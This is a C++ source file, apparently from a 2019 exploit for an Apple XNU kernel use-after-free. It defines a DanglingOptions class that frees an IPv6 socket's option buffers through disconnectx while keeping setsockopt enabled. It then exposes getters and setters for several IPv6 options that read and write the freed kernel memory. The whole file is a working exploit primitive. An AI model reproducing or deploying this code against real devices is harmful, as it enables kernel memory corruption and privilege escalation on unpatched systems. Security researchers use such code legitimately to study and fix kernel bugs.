// <3 nedwill 2019
#include "dangling_options.h"

#include <stdio.h>
#include <sys/errno.h>
#include <unistd.h>

DanglingOptions::DanglingOptions() : dangling_(false) {
  s_ = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
  if (s_ < 0) {
    printf("failed to create socket!\n");
  }

  // Permit setsockopt after disconnecting (and freeing socket options)
  struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT,
                                   .npx_mask = SONPX_SETOPTSHUT};
  int res = setsockopt(s_, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
  if (res != 0) {
    printf("failed to enable setsockopt after disconnect!\n");
  }

  // Allocate the options struct by setting any value, then free it
  // so all use of this class is against UaF'd socket option buffers.
  int minmtu = -1;
  SetMinmtu(&minmtu);
  FreeOptions();
}

DanglingOptions::~DanglingOptions() { close(s_); }

bool DanglingOptions::GetPktinfo(struct in6_pktinfo *pktinfo) {
  return GetIPv6Opt(IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

bool DanglingOptions::SetPktinfo(struct in6_pktinfo *pktinfo) {
  return SetIPv6Opt(IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

bool DanglingOptions::GetRthdr(struct ip6_rthdr *rthdr) {
  return GetIPv6Opt(IPV6_RTHDR, rthdr, sizeof(*rthdr));
}

bool DanglingOptions::SetRthdr(struct ip6_rthdr *rthdr) {
  return SetIPv6Opt(IPV6_RTHDR, rthdr, sizeof(*rthdr));
}

bool DanglingOptions::GetTclass(int *tclass) {
  return GetIPv6Opt(IPV6_TCLASS, tclass, sizeof(*tclass));
}

bool DanglingOptions::SetTclass(int *tclass) {
  return SetIPv6Opt(IPV6_TCLASS, tclass, sizeof(*tclass));
}

bool DanglingOptions::GetMinmtu(int *minmtu) {
  return GetIPv6Opt(IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

bool DanglingOptions::SetMinmtu(int *minmtu) {
  return SetIPv6Opt(IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

bool DanglingOptions::GetPreferTempaddr(int *prefer_tempaddr) {
  return GetIPv6Opt(IPV6_PREFER_TEMPADDR, prefer_tempaddr,
                    sizeof(*prefer_tempaddr));
}

bool DanglingOptions::SetPreferTempaddr(int *prefer_tempaddr) {
  return SetIPv6Opt(IPV6_PREFER_TEMPADDR, prefer_tempaddr,
                    sizeof(*prefer_tempaddr));
}

bool DanglingOptions::SetIPv6Opt(int option_name, void *data, socklen_t size) {
  int res = setsockopt(s_, IPPROTO_IPV6, option_name, data, size);
  if (res != 0) {
    printf("SetIpv6Opt got %d\n", errno);
    return false;
  }
  return true;
}

bool DanglingOptions::GetIPv6Opt(int option_name, void *data, socklen_t size) {
  int res = getsockopt(s_, IPPROTO_IPV6, option_name, data, &size);
  if (res != 0) {
    printf("GetIpv6Opt got %d\n", errno);
    return false;
  }
  return true;
}

bool DanglingOptions::FreeOptions() {
  if (dangling_) {
    return false;
  }
  dangling_ = true;
  int res = disconnectx(s_, 0, 0);
  return res == 0;
}
